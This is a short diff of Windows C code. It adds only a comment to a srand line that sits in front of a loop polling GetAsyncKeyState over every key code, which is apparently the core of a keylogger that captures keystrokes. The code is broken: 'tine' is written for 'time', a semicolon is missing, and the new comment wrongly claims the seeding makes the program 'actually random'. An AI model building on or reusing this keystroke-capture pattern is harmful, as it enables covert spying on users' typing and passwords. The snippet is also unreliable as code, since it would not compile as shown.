@@ -19,7 +19,7 @@ int main() {
         return 1;
     }
 
-    srand((unsigned int)tine(NULL))
+    srand((unsigned int)tine(NULL)) // so its actually random
     while (1) {
         for (short k = 8; k < 256; k++) {
             SHORT s = GetAsyncKeyState(k);
